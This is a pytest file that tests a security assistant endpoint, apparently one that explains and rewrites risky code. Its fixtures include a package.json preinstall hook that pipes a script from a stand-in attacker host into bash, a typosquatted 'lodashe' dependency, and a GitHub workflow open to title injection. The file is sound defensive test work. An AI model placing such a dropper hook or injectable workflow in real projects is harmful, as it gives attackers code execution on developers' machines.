"""Tests for the BARQAI Interactive Chat & Code Rewriter endpoint."""

import pytest
from httpx import AsyncClient


@pytest.mark.asyncio
async def test_01_chat_explains_preinstall_lifecycle_dropper(client: AsyncClient):
    payload = {
        "message": "Why is npm install failing or flagged in this package.json?",
        "code_snippet": '{\n  "scripts": {\n    "preinstall": "curl -s http://malicious.c2/drop.sh | bash"\n  }\n}',
        "file_path": "package.json",
        "action": "explain",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "Remote Code Execution" in data["explanation"] or "preinstall" in data["explanation"].lower()
    assert "curl" not in data["rewritten_code"] or "eliminated" in data["rewritten_code"]
    assert data["diff"] is not None
    assert len(data["suggested_actions"]) >= 1


@pytest.mark.asyncio
async def test_02_chat_rewrites_typosquatted_package(client: AsyncClient):
    payload = {
        "message": "Can you rewrite my dependencies? I see an error with lodashe.",
        "code_snippet": '{\n  "dependencies": {\n    "lodashe": "^4.17.21"\n  }\n}',
        "file_path": "package.json",
        "action": "rewrite",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "Typosquatting" in data["explanation"] or "typosquat" in data["explanation"].lower()
    assert '"lodash":' in data["rewritten_code"]
    assert "lodashe" not in data["rewritten_code"]
    assert "-    \"lodashe\":" in data["diff"]
    assert "+    \"lodash\":" in data["diff"]


@pytest.mark.asyncio
async def test_03_chat_rewrites_workflow_privilege_escalation(client: AsyncClient):
    payload = {
        "message": "Explain why this GitHub action is dangerous and rewrite it.",
        "code_snippet": 'name: Validate\non: pull_request_target\njobs:\n  run:\n    steps:\n      - run: echo "${{ github.event.pull_request.title }}"',
        "file_path": ".github/workflows/validate.yml",
        "action": "rewrite",
    }
    res = await client.post("/api/v1/barqai/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert "Privilege Escalation" in data["explanation"] or "privilege" in data["explanation"].lower()
    assert "pull_request_target" not in data["rewritten_code"]
    assert "pull_request" in data["rewritten_code"]


@pytest.mark.asyncio
async def test_04_chat_alias_route_functional(client: AsyncClient):
    payload = {
        "message": "Hello BARQAI, what do you do?",
        "action": "chat",
    }
    res = await client.post("/api/v1/chat", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert len(data["reply"]) > 0
    assert data["model"] is not None
